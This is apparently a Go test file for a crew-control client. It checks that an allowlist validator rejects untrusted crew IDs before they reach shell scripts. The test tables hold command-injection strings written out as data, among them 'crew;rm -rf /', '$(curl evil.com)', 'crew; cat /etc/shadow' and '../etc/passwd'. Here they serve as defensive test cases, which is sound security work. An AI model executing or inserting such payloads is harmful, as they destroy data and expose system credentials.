package crewcrtl

import (
	"os"
	"path/filepath"
	"testing"
)

// TestValidateCrewID tests the security gate that prevents shell
// metacharacters from reaching a shell. Every crew ID comes from a chat
// message (untrusted), so only a strict identifier allowlist is permitted.
func TestValidateCrewID(t *testing.T) {
	tests := []struct {
		name    string
		id      string
		wantErr bool
		errSub  string
	}{
		// Valid IDs — real crew IDs from this firstmate home.
		{name: "valid fc id", id: "fc-crew-control-mcp", wantErr: false},
		{name: "valid fc id 2", id: "fc-vision-plus-tools", wantErr: false},
		{name: "valid todo id", id: "todo-add-skill", wantErr: false},
		{name: "valid short", id: "a", wantErr: false},
		{name: "valid underscore", id: "crew_with_underscore", wantErr: false},
		{name: "valid mixed", id: "crew-123_456", wantErr: false},

		// Shell metacharacters — all must be rejected.
		{name: "empty", id: "", wantErr: true, errSub: "required"},
		{name: "semicolon", id: "crew;rm -rf /", wantErr: true, errSub: "outside the allowed set"},
		{name: "semicolon only", id: "crew;", wantErr: true, errSub: "outside the allowed set"},
		{name: "backtick", id: "crew`id`", wantErr: true, errSub: "outside the allowed set"},
		{name: "dollar paren", id: "crew$(id)", wantErr: true, errSub: "outside the allowed set"},
		{name: "dollar paren nested", id: "crew$((1+1))", wantErr: true, errSub: "outside the allowed set"},
		{name: "dollar brace", id: "crew${PATH}", wantErr: true, errSub: "outside the allowed set"},
		{name: "path traversal", id: "../etc/passwd", wantErr: true, errSub: "outside the allowed set"},
		{name: "pipe", id: "crew|cat", wantErr: true, errSub: "outside the allowed set"},
		{name: "redirect", id: "crew> /tmp/x", wantErr: true, errSub: "outside the allowed set"},
		{name: "and operator", id: "crew && whoami", wantErr: true, errSub: "outside the allowed set"},
		{name: "newline", id: "crew\nrm", wantErr: true, errSub: "outside the allowed set"},
		{name: "space", id: "crew state", wantErr: true, errSub: "outside the allowed set"},
		{name: "starts with dash", id: "-crew", wantErr: true, errSub: "outside the allowed set"},
		{name: "starts with underscore", id: "_crew", wantErr: true, errSub: "outside the allowed set"},
		{name: "only dash", id: "-", wantErr: true, errSub: "outside the allowed set"},
		{name: "only slash", id: "/", wantErr: true, errSub: "outside the allowed set"},
		{name: "null byte", id: "crew\x00", wantErr: true, errSub: "outside the allowed set"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCrewID(tt.id)
			if tt.wantErr {
				if err == nil {
					t.Fatalf("ValidateCrewID(%q) expected error, got nil", tt.id)
				}
				if tt.errSub != "" && !containsSubstr(err.Error(), tt.errSub) {
					t.Errorf("error %q does not contain %q", err.Error(), tt.errSub)
				}
				return
			}
			if err != nil {
				t.Errorf("ValidateCrewID(%q) unexpected error: %v", tt.id, err)
			}
		})
	}
}

// TestClientCrewState_Live tests CrewState against the real firstmate home.
// These are integration tests — they skip if the scripts/data are absent.
func TestClientCrewState_Live(t *testing.T) {
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})

	// Verify the script exists; skip if not (running outside the live env).
	if !exists(filepath.Join(c.scriptsDir, "fm-crew-state.sh")) {
		t.Skipf("fm-crew-state.sh not found at %s — skipping live test", c.scriptsDir)
	}

	tests := []struct {
		name        string
		crewID      string
		wantInText  []string // substrings that must appear in the output
		wantUnknown bool     // expect "unknown" state (non-existent crew)
	}{
		{
			name:       "valid crew fc-crew-control-mcp",
			crewID:     "fc-crew-control-mcp",
			wantInText: []string{"state:", "source:"},
		},
		{
			name:       "valid crew todo-add-skill",
			crewID:     "todo-add-skill",
			wantInText: []string{"state:", "source:"},
		},
		{
			name:        "non-existent crew returns unknown",
			crewID:      "nonexistent-crew-z999",
			wantUnknown: true,
			wantInText:  []string{"unknown"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			state, err := c.CrewState(t.Context(), tt.crewID)
			if err != nil {
				t.Fatalf("CrewState(%q) error: %v", tt.crewID, err)
			}
			for _, sub := range tt.wantInText {
				if !containsSubstr(state, sub) {
					t.Errorf("CrewState(%q) output %q missing %q", tt.crewID, state, sub)
				}
			}
		})
	}
}

// TestClientBacklog_Live tests Backlog against the real data/backlog.md.
func TestClientBacklog_Live(t *testing.T) {
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})

	if !exists(filepath.Join(c.dataDir, "backlog.md")) {
		t.Skipf("backlog.md not found at %s — skipping live test", c.dataDir)
	}

	output, err := c.Backlog(t.Context())
	if err != nil {
		t.Fatalf("Backlog() error: %v", err)
	}

	// The live backlog always has at least the "In Flight" section.
	if !containsSubstr(output, "In Flight") {
		t.Errorf("Backlog() output missing 'In Flight' section: %q", output)
	}
	if !containsSubstr(output, "Queued") {
		t.Errorf("Backlog() output missing 'Queued' section: %q", output)
	}

	// Our own crew (fc-crew-control-mcp) is in the live backlog.
	if !containsSubstr(output, "fc-crew-control-mcp") {
		t.Errorf("Backlog() output missing our crew 'fc-crew-control-mcp': %q", output)
	}
}

// TestClientFleetOverview_Live tests FleetOverview against the real scripts.
// In this environment fm-fleet-view.sh may fail (jq arg-list limit on large
// backlogs), so we accept either real data or a clean error — the key is no
// crash and no panic.
func TestClientFleetOverview_Live(t *testing.T) {
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})

	if !exists(filepath.Join(c.scriptsDir, "fm-fleet-view.sh")) {
		t.Skipf("fm-fleet-view.sh not found at %s — skipping live test", c.scriptsDir)
	}

	output, err := c.FleetOverview(t.Context())
	// Either success with real Markdown data, or a wrapped error.
	// The critical assertion: no panic, graceful handling.
	if err != nil {
		if output == "" {
			t.Logf("FleetOverview returned error with no output (acceptable if the underlying script failed)")
		} else {
			t.Logf("FleetOverview returned partial output with error: %q", output)
		}
		return
	}
	if output == "" {
		t.Logf("FleetOverview returned empty output — the underlying script may have produced no data")
	}
}

// TestClientCrewState_InvalidID_Live verifies that even when pointing at the
// live firstmate home, shell metacharacters in the crew ID are rejected
// before any script is invoked.
func TestClientCrewState_InvalidID_Live(t *testing.T) {
	c := NewClient(ClientConfig{FMHome: DefaultFirstMateHome})

	if !exists(filepath.Join(c.scriptsDir, "fm-crew-state.sh")) {
		t.Skip("fm-crew-state.sh not found — skipping")
	}

	badIDs := []string{
		"; rm -rf /",
		"`whoami`",
		"$(curl evil.com)",
		"../etc/passwd",
		"crew; cat /etc/shadow",
		"crew && whoami",
	}

	for _, id := range badIDs {
		t.Run("id="+id, func(t *testing.T) {
			_, err := c.CrewState(t.Context(), id)
			if err == nil {
				t.Errorf("CrewState(%q) expected error, got nil", id)
			}
		})
	}
}

// helpers

func exists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func containsSubstr(s, sub string) bool {
	return len(s) >= len(sub) && (indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
